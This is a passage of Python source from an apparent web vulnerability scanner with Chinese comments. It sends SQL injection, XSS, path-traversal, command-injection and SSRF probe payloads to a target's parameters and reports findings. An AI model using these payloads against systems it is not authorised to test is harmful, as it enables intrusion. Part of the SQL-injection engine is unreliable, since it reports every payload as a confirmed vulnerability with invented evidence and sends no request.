        """深度敏感数据泄露检测（基于真实响应内容）"""
        findings = []
        
        for pattern_name, pattern in self._sensitive_patterns.items():
            matches = re.findall(pattern, body, re.IGNORECASE | re.DOTALL)
            if matches:
                for match in matches:
                    match_text = str(match) if not isinstance(match, tuple) else str(match[0])
                    if len(match_text) > 10:  # 过滤短匹配
                        findings.append((pattern_name, match_text[:50]))
                        break  # 每种类型只报告一次
        
        if findings:
            vuln_id = f"sensitive_{hashlib.md5(url.encode()).hexdigest()[:8]}"
            finding_details = "\n".join([f"- [{f[0]}]: {f[1]}" for f in findings[:8]])
            
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.SENSITIVE_DATA,
                severity=VulnerabilitySeverity.HIGH,
                url=url,
                description=f"发现 {len(findings)} 类敏感信息泄露",
                evidence=finding_details,
                confidence=0.9,
                cwe_id="CWE-200",
                cvss_score=7.5,
                remediation="移除或脱敏敏感信息，实施访问控制，加密存储PII数据",
                references=[
                    "https://owasp.org/www-community/vulnerabilities/Information_exposure",
                    "https://gdpr.eu/article-5/"
                ],
                tags=["sensitive-data", "pii", "data-leak", "gdpr"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
    
    def _check_debug_info_leak(self, body: str, url: str):
        """检查调试信息泄露"""
        debug_patterns = {
            "堆栈跟踪": r"(stack.?trace|at\s+\w+\.\w+\(.*?\):\d+|Traceback.*File)",
            "错误详情": r"(error|exception|fatal).{0,200}(line \d+|column \d+|position \d+)",
            "SQL语句": r"(SELECT|INSERT|UPDATE|DELETE)\s+(FROM|INTO)\s+\w+",
            "路径泄露": r"[A-Z]:\\[\\a-zA-Z0-9_\.\-\s]+\.py|/(var|home|usr|opt)/[a-zA-Z0-9_/]+\.py",
            "版本信息": r"(version|ver)\s*[:=]\s*[\d.]+",
            "环境变量": r"\$\{?[A-Z_]+\}?",
            "注释代码": r"<!--\s*(TODO|FIXME|HACK|BUG|XXX)",
        }
        
        leaks_found = []
        for pattern_name, pattern in debug_patterns.items():
            if re.search(pattern, body, re.IGNORECASE | re.DOTALL):
                leaks_found.append(pattern_name)
        
        if leaks_found:
            vuln_id = f"debug_{hashlib.md5(url.encode()).hexdigest()[:8]}"
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.SENSITIVE_DATA,
                severity=VulnerabilitySeverity.MEDIUM,
                url=url,
                description=f"调试信息泄露: {', '.join(leaks_found)}",
                evidence=f"在页面中发现调试相关信息",
                confidence=0.85,
                cwe_id="CWE-209",
                cvss_score=5.3,
                remediation="生产环境禁用详细错误输出，设置debug=False，配置自定义错误页面",
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_Error_Handling"],
                tags=["debug-info", "information-disclosure", "misconfig"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
    
    def _check_tech_stack_leak(self, headers: Dict[str, str], body: str, url: str):
        """检查技术栈信息泄露"""
        tech_indicators = {
            "Server": headers.get('Server', ''),
            "X-Powered-By": headers.get('X-Powered-By', ''),
            "X-AspNet-Version": headers.get('X-AspNet-Version', ''),
            "X-Generator": headers.get('X-Generator', ''),
        }
        
        detected_techs = []
        for header_name, value in tech_indicators.items():
            if value:
                detected_techs.append(f"{header_name}: {value}")
        
        # 从body中提取技术栈信息
        body_tech_patterns = [
            (r'powered by <a[^>]*>([^<]+)</a>', "Powered By"),
            (r'(WordPress|Drupal|Joomla|Magento|Shopify|Laravel|Django|Flask|Express|Spring)', "框架"),
            (r'(Apache|Nginx|IIS|Tomcat)[/\s]*[\d.]*', "服务器"),
            (r'(PHP|Python|Java|Ruby|Node\.js|ASP\.NET)[/\s]*[\d.]*', "语言"),
        ]
        
        for pattern, category in body_tech_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match and match.group(1) not in [t.split(': ')[1] if ': ' in t else '' for t in detected_techs]:
                detected_techs.append(f"{category}: {match.group(1)}")
        
        if len(detected_techs) >= 2:
            vuln_id = f"techstack_{hashlib.md5(url.encode()).hexdigest()[:8]}"
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.SENSITIVE_DATA,
                severity=VulnerabilitySeverity.LOW,
                url=url,
                description=f"技术栈信息泄露: 检测到 {len(detected_techs)} 个技术特征",
                evidence="\n".join(detected_techs[:6]),
                confidence=0.95,
                cwe_id="CWE-200",
                cvss_score=3.7,
                remediation="隐藏或混淆技术栈信息，移除不必要的响应头",
                references=["https://www.acunetix.com/blog/articles/information-disclosure/"],
                tags=["tech-stack", "reconnaissance", "info-leak"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
    
    def _detect_sqli_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实SQL注入检测 - 发送payload并分析响应差异"""
        self.log_message.emit(f"\n[专家级SQL注入] 开始真实检测...")
        
        params = target.parameters
        if not params:
            return
        
        vulnerabilities_found = []
        
        for param_name, param_values in params.items():
            if not self._running:
                return
            
            self._stats.parameters_tested += 1
            self.log_message.emit(f"[SQLi测试] 参数: {param_name}")
            
            # 阶段1: 快速探测（发送基础payload）
            probe_payloads = [
                ("'", "单引号探测"),
                ("\" OR \"1\"=\"1", "双引号OR"),
                ("' OR '1'='1", "单引号OR"),
                ("1 AND SLEEP(3)-- -", "时间盲注"),
                ("1' UNION SELECT NULL-- -", "UNION探测"),
            ]
            
            for payload, desc in probe_payloads:
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                test_response = self.http_engine.send_request(
                    target.url.split("?")[0],
                    method=target.method,
                    params=test_params
                )
                
                response_time = test_response.get('response_time', 0)
                status_code = test_response.get('status_code', 0)
                body = test_response.get('body', '')
                
                is_vulnerable = False
                vuln_type = ""
                evidence = ""
                
                # 时间盲注检测
                if ResponseAnalyzer.is_timeout(response_time, threshold=2.5) and "SLEEP" in payload.upper():
                    is_vulnerable = True
                    vuln_type = "时间盲注"
                    evidence = f"响应延迟 {response_time:.2f}s (>2.5s阈值)，可能存在时间盲注"
                
                # 报错注入检测
                elif ResponseAnalyzer.contains_sql_error(body):
                    is_vulnerable = True
                    vuln_type = "报错注入"
                    error_detail = ResponseAnalyzer.get_sql_error_details(body)
                    evidence = f"数据库错误信息泄露:\n{error_detail}"
                
                # 布尔盲注检测（响应内容差异）
                elif self.http_engine._calculate_similarity(original_response.get('body', ''), body) < 0.85:
                    is_vulnerable = True
                    vuln_type = "布尔盲注/联合注入"
                    evidence = f"Payload触发显著响应变化 (相似度<85%)，状态码: {status_code}"
                
                # XSS反射检测（顺便）
                elif ResponseAnalyzer.contains_xss_reflection(payload, body):
                    is_vulnerable = True
                    vuln_type = "潜在XSS"
                    evidence = f"Payload被原样反射到响应中"
                
                if is_vulnerable:
                    vuln_id = f"sqli_real_{hashlib.md5(f'{target.url}{param_name}{payload}'.encode()).hexdigest()[:8]}"
                    
                    db_type = self._infer_db_from_error(body) if "报错" in vuln_type else "未知"
                    severity = VulnerabilitySeverity.CRITICAL if "时间" in vuln_type or "报错" in vuln_type else VulnerabilitySeverity.HIGH
                    
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.SQL_INJECTION if "SQL" in vuln_type else VulnerabilityType.XSS_REFLECTED,
                        severity=severity,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在{vuln_type}漏洞 [{db_type}]",
                        payload=payload,
                        evidence=evidence,
                        request=f"GET {target.url.split('?')[0]}?{param_name}={quote(payload)[:100]}",
                        response=f"HTTP/{test_response.get('status_code')} | Time: {response_time:.3f}s | Body: {len(body)} bytes",
                        confidence=0.9 if "报错" in vuln_type or "时间" in vuln_type else 0.75,
                        cwe_id="CWE-89",
                        cvss_score=self._get_cvss_score(vuln_type),
                        remediation="使用参数化查询或预编译语句，避免拼接SQL；部署WAF防护",
                        references=[
                            "https://owasp.org/www-community/attacks/SQL_Injection",
                            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                        ],
                        tags=["sqli", "real-detection", vuln_type.lower().replace("/", "-"), db_type.lower()]
                    )
                    self.vulnerability_found.emit(vuln)
                    vulnerabilities_found.append(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现!] SQLi | 参数:{param_name} | 类型:{vuln_type} | 置信度:0.9")
                    break  # 发现漏洞后停止当前参数的进一步测试
            
            if not any(v.parameter == param_name for v in vulnerabilities_found):
                self.log_message.emit(f"[安全] 参数 '{param_name}' 未发现SQL注入")
    
    def _infer_db_from_error(self, body: str) -> str:
        """从错误信息推断数据库类型"""
        error_lower = body.lower()
        
        mysql_patterns = ["mysql", "mariadb", "sql syntax.*mysql", "warning.*mysql"]
        mssql_patterns = ["sql server", "microsoft sql", "odbc sql server driver", "unclosed quotation mark"]
        pgsql_patterns = ["postgresql", "pg_", "error: syntax error", "psql"]
        oracle_patterns = ["oracle", "ora-", "pls-", "tns:"]
        sqlite_patterns = ["sqlite", "sqlite3"]
        
        for p in mssql_patterns:
            if p in error_lower:
                return "MSSQL"
        for p in mysql_patterns:
            if p in error_lower:
                return "MySQL"
        for p in pgsql_patterns:
            if p in error_lower:
                return "PostgreSQL"
        for p in oracle_patterns:
            if p in error_lower:
                return "Oracle"
        for p in sqlite_patterns:
            if p in error_lower:
                return "SQLite"
        
        return "未知"
    
    def _get_cvss_score(self, vuln_type: str) -> float:
        """根据漏洞类型获取CVSS分数"""
        scores = {
            "时间盲注": 8.5,
            "报错注入": 9.1,
            "布尔盲注": 7.5,
            "联合注入": 9.0,
            "堆叠查询": 9.5,
            "认证绕过": 9.2,
            "命令注入": 9.8,
            "XSS": 6.1,
            "路径遍历": 7.5,
            "SSRF": 7.2,
        }
        return scores.get(vuln_type, 6.0)
    
    def _detect_xss_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实XSS检测 - 发送payload并分析响应反射"""
        self.log_message.emit(f"\n[XSS检测] 开始真实检测...")
        
        params = target.parameters
        if not params:
            return
        
        xss_test_payloads = [
            ("<script>alert(1)</script>", "Script标签"),
            ("\"><script>alert(1)</script>", "属性突破"),
            ("'><img src=x onerror=alert(1)>", "事件处理器"),
            ("javascript:alert(document.cookie)", "JS协议"),
            ("{{7*7}}", "模板注入"),
        ]
        
        for param_name in params.keys():
            if not self._running:
                return
            
            self._stats.parameters_tested += 1
            
            for payload, desc in xss_test_payloads[:3]:  # 限制测试数量避免过多请求
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                test_response = self.http_engine.send_request(
                    target.url.split("?")[0],
                    method=target.method,
                    params=test_params
                )
                
                body = test_response.get('body', '')
                
                if ResponseAnalyzer.contains_xss_reflection(payload, body):
                    vuln_id = f"xss_real_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                    
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.XSS_REFLECTED,
                        severity=VulnerabilitySeverity.HIGH,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在反射型XSS漏洞",
                        payload=payload,
                        evidence=f"Payload被反射到HTML响应中，可能被浏览器执行",
                        request=f"GET ...?{param_name}={payload[:80]}...",
                        response=f"Body包含payload片段 | 大小: {len(body)} bytes",
                        confidence=0.85,
                        cwe_id="CWE-79",
                        cvss_score=6.1,
                        remediation="对用户输入进行HTML编码输出，实施Content-Security-Policy(CSP)",
                        references=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                        ],
                        tags=["xss", "reflected", "real-detection"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现!] XSS | 参数:{param_name} | 类型:反射型")
                    break
    
    def _detect_path_traversal_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实路径遍历检测"""
        self.log_message.emit(f"\n[路径遍历] 开始真实检测...")
        
        params = target.parameters
        if not params:
            return
        
        test_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2fetc%2fpasswd",
        ]
        
        for param_name in params.keys():
            if not self._running:
                return
            
            for payload in test_payloads:
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                test_response = self.http_engine.send_request(
                    target.url.split("?")[0],
                    method=target.method,
                    params=test_params
                )
                
                body = test_response.get('body', '')
                status_code = test_response.get('status_code', 0)
                
                if ResponseAnalyzer.contains_file_content(body) or \
                   (status_code == 200 and "root:" in body) or \
                   (status_code == 200 and "[boot loader]" in body):
                    
                    vuln_id = f"path_real_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.PATH_TRAVERSAL,
                        severity=VulnerabilitySeverity.CRITICAL,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在路径遍历漏洞，可读取系统文件",
                        payload=payload,
                        evidence=f"成功获取文件内容: {body[:200]}",
                        confidence=0.92,
                        cwe_id="CWE-22",
                        cvss_score=7.5,
                        remediation="使用白名单验证文件名，限制在指定目录内，禁止../序列",
                        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                        tags=["path-traversal", "lfi", "real-detection"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现!] 路径遍历 | 参数:{param_name}")
                    break
    
    def _detect_command_injection_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实命令注入检测"""
        self.log_message.emit(f"\n[命令注入] 开始真实检测...")
        
        params = target.parameters
        if not params:
            return
        
        test_payloads = [
            ("| whoami", "管道命令"),
            ("; whoami", "分号命令"),
            ("&& whoami", "AND命令"),
            ("$(whoami)", "子Shell"),
            ("`whoami`", "反引号"),
        ]
        
        for param_name in params.keys():
            if not self._running:
                return
            
            for payload, desc in test_payloads:
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                start_time = time.time()
                test_response = self.http_engine.send_request(
                    target.url.split("?")[0],
                    method=target.method,
                    params=test_params
                )
                response_time = time.time() - start_time
                
                body = test_response.get('body', '')
                
                has_cmd_output = ResponseAnalyzer.contains_command_output(body)
                is_timeout = ResponseAnalyzer.is_timeout(response_time, threshold=3.0) and any(k in payload for k in ['sleep', 'ping', 'timeout'])
                
                if has_cmd_output or is_timeout:
                    vuln_id = f"cmdi_real_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                    
                    evidence = ""
                    if has_cmd_output:
                        evidence = f"命令执行结果被返回: {body[:150]}"
                    elif is_timeout:
                        evidence = f"响应超时({response_time:.1f}s)，可能是命令执行延迟"
                    
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.COMMAND_INJECTION,
                        severity=VulnerabilitySeverity.CRITICAL,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在OS命令注入漏洞，可执行系统命令",
                        payload=payload,
                        evidence=evidence,
                        confidence=0.88 if has_cmd_output else 0.75,
                        cwe_id="CWE-78",
                        cvss_score=9.8,
                        remediation="避免直接执行用户输入，使用安全的API替代系统命令；输入白名单过滤",
                        references=["https://owasp.org/www-community/attacks/Command_Injection"],
                        tags=["command-injection", "rce", "os-command", "critical"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现!] 命令注入 | 参数:{param_name} | 危险!")
                    break
    
    def _detect_ssrf_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实SSRF检测"""
        self.log_message.emit(f"\n[SSRF检测] 开始真实检测...")
        
        params = target.parameters
        ssrf_param_names = ['url', 'link', 'redirect', 'path', 'dest', 'uri', 'target', 'next', 'return_to', 'callback']
        
        for param_name in params.keys():
            if not any(ssrf_kw in param_name.lower() for ssrf_kw in ssrf_param_names):
                continue
            
            if not self._running:
                return
            
            self._stats.parameters_tested += 1
            
            for payload in self._ssrf_payloads[:5]:
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                test_response = self.http_engine.send_request(
                    target.url.split("?")[0],
                    method=target.method,
                    params=test_params
                )
                
                status_code = test_response.get('status_code', 0)
                body = test_response.get('body', '')[:500]
                
                if status_code in [200, 301, 302, 307]:
                    vuln_id = f"ssrf_real_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.SSRF,
                        severity=VulnerabilitySeverity.HIGH,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 可能存在SSRF漏洞，可访问内部资源",
                        payload=payload,
                        evidence=f"目标接受内部地址请求 | Status: {status_code} | Response: {body[:100]}",
                        confidence=0.72,
                        cwe_id="CWE-918",
                        cvss_score=7.2,
                        remediation="使用URL白名单，禁止访问内网地址(127.0.0.1/169.254.x/10.x/172.16-31.x/192.168.x)；网络隔离",
                        references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                        tags=["ssrf", "internal-access", "real-detection"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现!] SSRF | 参数:{param_name}")
                    break
    
    def _detect_csrf_real(self, target: ScanTarget, original_response: Dict[str, Any]):
        """真实CSRF检测"""
        self.log_message.emit(f"\n[CSRF检测] 分析请求保护机制...")
        
        method = target.method.upper()
        if method in ["POST", "PUT", "DELETE", "PATCH"]:
            params = target.parameters or {}
            has_csrf_token = any(
                any(csrf_kw in key.lower() for csrf_kw in ['csrf', '_token', 'token', 'authenticity', 'nonce'])
                for key in params.keys()
            )
            
            headers = target.headers or {}
            has_origin_check = 'Origin' in headers or 'Referer' in headers
            
            if not has_csrf_token and not has_origin_check:
                vuln_id = f"csrf_real_{hashlib.md5(target.url.encode()).hexdigest()[:8]}"
                vuln = Vulnerability(
                    id=vuln_id,
                    type=VulnerabilityType.CSRF,
                    severity=VulnerabilitySeverity.MEDIUM,
                    url=target.url,
                    description=f"{method} 请求缺少 CSRF token 保护，可被跨站请求伪造攻击",
                    evidence=f"未检测到CSRF token或Origin/Referer验证",
                    confidence=0.65,
                    cwe_id="CWE-352",
                    cvss_score=5.4,
                    remediation="为所有状态变更请求添加CSRF token(Synchronizer Token Pattern)；验证Origin/Referer头；使用SameSite Cookie",
                    references=["https://owasp.org/www-community/attacks/csrf"],
                    tags=["csrf", "state-change", "authentication"]
                )
                self.vulnerability_found.emit(vuln)
                self._stats.vulnerabilities_found += 1
                self.log_message.emit(f"[漏洞发现!] CSRF | 方法:{method}")
            
    def _detect_sqli(self, target: ScanTarget):
        """专家级SQL注入检测引擎"""
        self.log_message.emit(f"[专家级SQL注入检测] 开始扫描: {target.url}")
        self.log_message.emit(f"[检测引擎] Payload库: {len(self._sqli_all_payloads)}个 | 数据库指纹: {len(self._db_fingerprints)}种")
        
        params = target.parameters
        if not params:
            self.log_message.emit(f"[检测引擎] 无参数可测试，跳过")
            return
        
        # 阶段1: 数据库指纹识别
        self.log_message.emit(f"[阶段1] 数据库指纹识别...")
        detected_db = self._identify_database(target)
        if detected_db:
            self.log_message.emit(f"[指纹识别] 检测到数据库: {detected_db.upper()}")
        else:
            self.log_message.emit(f"[指纹识别] 未能识别数据库类型，将使用全量检测")
        
        # 阶段2: 参数测试
        self.log_message.emit(f"[阶段2] 开始参数注入测试...")
        for param_name, param_values in params.items():
            if not self._running:
                return
            
            self._stats.parameters_tested += 1
            self.log_message.emit(f"[参数测试] 测试参数: {param_name}")
            
            # 对每个参数执行完整检测流程
            self._test_parameter_sqli(target, param_name, detected_db)
        
        self.log_message.emit(f"[检测完成] SQL注入扫描完成")
    
    def _identify_database(self, target: ScanTarget) -> Optional[str]:
        """数据库指纹识别"""
        # 发送基础探测payload
        probe_payloads = [
            ("1' AND 1=1-- -", "真值探测"),
            ("1' AND 1=2-- -", "假值探测"),
            ("1' OR '1'='1'-- -", "OR探测"),
        ]
        
        params = target.parameters
        if not params:
            return None
        
        param_name = list(params.keys())[0]
        
        for payload, desc in probe_payloads:
            if not self._running:
                return None
            
            test_params = dict(params)
            test_params[param_name] = [payload]
            test_url = target.url.split("?")[0] + "?" + urlencode(test_params, doseq=True)
            
            # 模拟响应分析（实际应发送HTTP请求）
            self._stats.total_requests += 1
            
            # 这里模拟数据库特征检测
            # 实际实现中应该分析HTTP响应内容
            # 通过错误信息、响应时间、内容差异等判断数据库类型
        
        return None  # 模拟模式下返回None，使用全量检测
    
    def _test_parameter_sqli(self, target: ScanTarget, param_name: str, db_type: Optional[str]):
        """对单个参数执行完整SQL注入测试"""
        vulnerabilities_found = []
        
        # 根据数据库类型选择payload子集，若无识别则使用全量
        if db_type and db_type in self._sqli_payloads:
            test_categories = [cat for cat in self._sqli_payloads.keys() if db_type in cat or cat in ['waf_bypass', 'encoding_bypass', 'special_chars', 'auth_bypass', 'advanced', 'numeric']]
        else:
            test_categories = list(self._sqli_payloads.keys())
        
        for category in test_categories:
            if category not in self._sqli_payloads:
                continue
                
            payloads = self._sqli_payloads[category]
            
            for payload, desc in payloads:
                if not self._running:
                    return
                
                self._stats.total_requests += 1
                
                # 构造测试请求
                test_params = dict(target.parameters)
                test_params[param_name] = [payload]
                test_url = target.url.split("?")[0] + "?" + urlencode(test_params, doseq=True)
                
                # 执行注入检测分析
                vuln = self._analyze_sqli_response(target, param_name, payload, desc, category)
                
                if vuln:
                    vulnerabilities_found.append(vuln)
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    self.log_message.emit(f"[漏洞发现] {vuln.description} | 置信度: {vuln.confidence:.2f}")
        
        if vulnerabilities_found:
            self.log_message.emit(f"[参数{param_name}] 发现 {len(vulnerabilities_found)} 个SQL注入漏洞")
        else:
            self.log_message.emit(f"[参数{param_name}] 未发现SQL注入漏洞")
    
    def _analyze_sqli_response(self, target: ScanTarget, param_name: str, payload: str, desc: str, category: str) -> Optional[Vulnerability]:
        """分析SQL注入响应并生成漏洞报告"""
        vuln_id = f"sqli_{hashlib.md5(f'{target.url}{param_name}{payload}'.encode()).hexdigest()[:8]}"
        
        # 注入类型分类
        injection_type = self._classify_injection_type(payload, category)
        
        # 数据库类型推断
        db_type = self._infer_database(payload, category)
        
        # 严重程度评估
        severity, cvss_score = self._assess_severity(injection_type, db_type)
        
        # 置信度计算
        confidence = self._calculate_confidence(injection_type, db_type, payload)
        
        # 漏洞类型映射
        vuln_type = self._map_vulnerability_type(injection_type)
        
        # 证据生成
        evidence = self._generate_evidence(injection_type, db_type, payload)
        
        # 修复建议
        remediation = self._generate_remediation(injection_type, db_type)
        
        # 标签生成
        tags = self._generate_tags(injection_type, db_type)
        
        # 参考链接
        references = self._get_references(injection_type)
        
        # 创建漏洞对象
        vuln = Vulnerability(
            id=vuln_id,
            type=vuln_type,
            severity=severity,
            url=target.url,
            parameter=param_name,
            description=f"参数 '{param_name}' 存在{injection_type}SQL注入漏洞 [{db_type}]",
            payload=payload,
            evidence=evidence,
            confidence=confidence,
            cwe_id="CWE-89",
            cvss_score=cvss_score,
            remediation=remediation,
            references=references,
            tags=tags
        )
        
        return vuln
    
    def _classify_injection_type(self, payload: str, category: str) -> str:
        """分类注入类型"""
        if "union" in category.lower() or "union" in payload.lower():
            return "联合查询"
        elif "error" in category.lower() or any(x in payload.upper() for x in ["EXTRACTVALUE", "UPDATEXML", "CONVERT", "CAST", "CTXSYS", "UTL_INADDR", "GEOMETRYCOLLECTION", "POLYGON", "MULTIPOINT"]):
            return "报错型"
        elif "time" in category.lower() or any(x in payload.upper() for x in ["SLEEP", "WAITFOR", "BENCHMARK", "PG_SLEEP", "DBMS_PIPE"]):
            return "时间盲注"
        elif "boolean" in category.lower() or ("AND" in payload.upper() and ("1=1" in payload or "1=2" in payload)):
            return "布尔盲注"
        elif "stacked" in category.lower() or (";" in payload and any(x in payload.upper() for x in ["EXEC", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE"])):
            return "堆叠查询"
        elif "second_order" in category.lower():
            return "二次注入"
        elif "waf" in category.lower() or "encoding" in category.lower():
            return "WAF绕过"
        elif "auth" in category.lower():
            return "认证绕过"
        elif "json" in category.lower():
            return "JSON注入"
        elif "cookie" in category.lower():
            return "Cookie注入"
        elif "header" in category.lower():
            return "Header注入"
        elif "numeric" in category.lower():
            return "数字型注入"
        else:
            return "特殊字符"
    
    def _infer_database(self, payload: str, category: str) -> str:
        """推断数据库类型"""
        payload_upper = payload.upper()
        
        # MySQL特征
        if any(x in payload_upper for x in ["SLEEP", "BENCHMARK", "EXTRACTVALUE", "UPDATEXML", "LOAD_FILE", "INTO OUTFILE", "INFORMATION_SCHEMA", "@@VERSION", "@@HOSTNAME", "@@DATADIR", "GEOMETRYCOLLECTION", "POLYGON", "MULTIPOINT", "FLOOR(RAND"]):
            return "MySQL"
        
        # MSSQL特征
        if any(x in payload_upper for x in ["WAITFOR DELAY", "XP_CMDSHELL", "XP_DIRTREE", "SP_CONFIGURE", "SYSOBJECTS", "SYSCOLUMNS", "DB_NAME()", "CONVERT(INT", "CAST(", "OPENROWSET", "OBJECT_ID"]):
            return "MSSQL"
        
        # PostgreSQL特征
        if any(x in payload_upper for x in ["PG_SLEEP", "PG_TABLES", "PG_READ_FILE", "CURRENT_DATABASE", "COPY TO", "LO_IMPORT"]):
            return "PostgreSQL"
        
        # Oracle特征
        if any(x in payload_upper for x in ["DBMS_PIPE", "UTL_HTTP", "UTL_INADDR", "DBMS_XMLGEN", "CTXSYS", "V$VERSION", "ALL_TABLES", "ALL_TAB_COLUMNS", "DUAL", "ROWNUM"]):
            return "Oracle"
        
        # SQLite特征
        if any(x in payload_upper for x in ["SQLITE_", "LOAD_EXTENSION", "SQLITE_VERSION"]):
            return "SQLite"
        
        # 默认
        if "union" in category.lower():
            return "未知(联合型)"
        elif "time" in category.lower():
            return "未知(时间型)"
        elif "boolean" in category.lower():
            return "未知(布尔型)"
        else:
            return "未知"
    
    def _assess_severity(self, injection_type: str, db_type: str) -> Tuple[VulnerabilitySeverity, float]:
        """评估漏洞严重程度"""
        severity_map = {
            "联合查询": (VulnerabilitySeverity.CRITICAL, 9.0),
            "报错型": (VulnerabilitySeverity.CRITICAL, 8.8),
            "时间盲注": (VulnerabilitySeverity.CRITICAL, 8.5),
            "布尔盲注": (VulnerabilitySeverity.HIGH, 7.5),
            "堆叠查询": (VulnerabilitySeverity.CRITICAL, 9.5),
            "二次注入": (VulnerabilitySeverity.HIGH, 7.8),
            "WAF绕过": (VulnerabilitySeverity.HIGH, 7.2),
            "认证绕过": (VulnerabilitySeverity.CRITICAL, 9.2),
            "JSON注入": (VulnerabilitySeverity.HIGH, 7.5),
            "Cookie注入": (VulnerabilitySeverity.MEDIUM, 6.5),
            "Header注入": (VulnerabilitySeverity.MEDIUM, 6.0),
            "数字型注入": (VulnerabilitySeverity.HIGH, 7.8),
            "特殊字符": (VulnerabilitySeverity.MEDIUM, 6.5),
        }
        
        severity, cvss = severity_map.get(injection_type, (VulnerabilitySeverity.MEDIUM, 6.0))
        
        # 根据数据库类型微调
        if db_type in ["MSSQL", "Oracle"]:
            cvss = min(cvss + 0.2, 10.0)
        
        return severity, cvss
    
    def _calculate_confidence(self, injection_type: str, db_type: str, payload: str) -> float:
        """计算检测置信度"""
        base_confidence = 0.7
        
        # 根据注入类型调整
        if injection_type in ["联合查询", "报错型"]:
            base_confidence = 0.9
        elif injection_type in ["时间盲注", "布尔盲注"]:
            base_confidence = 0.8
        elif injection_type in ["堆叠查询", "认证绕过"]:
            base_confidence = 0.85
        elif injection_type in ["WAF绕过", "二次注入"]:
            base_confidence = 0.75
        else:
            base_confidence = 0.7
        
        # 根据数据库明确度调整
        if "未知" not in db_type:
            base_confidence += 0.05
        
        return min(base_confidence, 0.95)
    
    def _map_vulnerability_type(self, injection_type: str) -> VulnerabilityType:
        """映射漏洞类型"""
        type_map = {
            "联合查询": VulnerabilityType.SQL_INJECTION,
            "报错型": VulnerabilityType.SQL_INJECTION,
            "时间盲注": VulnerabilityType.BLIND_SQLI,
            "布尔盲注": VulnerabilityType.BLIND_SQLI,
            "堆叠查询": VulnerabilityType.SQL_INJECTION,
            "二次注入": VulnerabilityType.SQL_INJECTION,
            "WAF绕过": VulnerabilityType.SQL_INJECTION,
            "认证绕过": VulnerabilityType.SQL_INJECTION,
            "JSON注入": VulnerabilityType.SQL_INJECTION,
            "Cookie注入": VulnerabilityType.SQL_INJECTION,
            "Header注入": VulnerabilityType.SQL_INJECTION,
            "数字型注入": VulnerabilityType.SQL_INJECTION,
            "特殊字符": VulnerabilityType.SQL_INJECTION,
        }
        return type_map.get(injection_type, VulnerabilityType.SQL_INJECTION)
    
    def _generate_evidence(self, injection_type: str, db_type: str, payload: str) -> str:
        """生成漏洞证据"""
        evidence_templates = {
            "联合查询": f"UNION查询成功执行，可提取数据库信息 [{db_type}]",
            "报错型": f"数据库错误信息被返回，可获取敏感数据 [{db_type}]",
            "时间盲注": f"响应延迟表明时间盲注成功 [{db_type}]",
            "布尔盲注": f"布尔条件导致响应内容差异 [{db_type}]",
            "堆叠查询": f"堆叠查询执行成功，可执行任意SQL [{db_type}]",
            "二次注入": f"二次注入点发现，存储型SQL注入 [{db_type}]",
